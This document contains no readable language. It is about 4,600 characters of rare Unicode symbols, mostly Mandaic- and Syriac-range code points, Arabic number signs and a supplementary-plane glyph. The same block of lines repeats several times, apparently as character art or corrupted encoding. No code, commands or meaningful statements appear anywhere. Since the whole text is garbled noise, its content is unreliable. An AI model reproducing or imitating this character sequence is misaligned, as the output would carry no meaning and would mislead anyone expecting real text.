࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛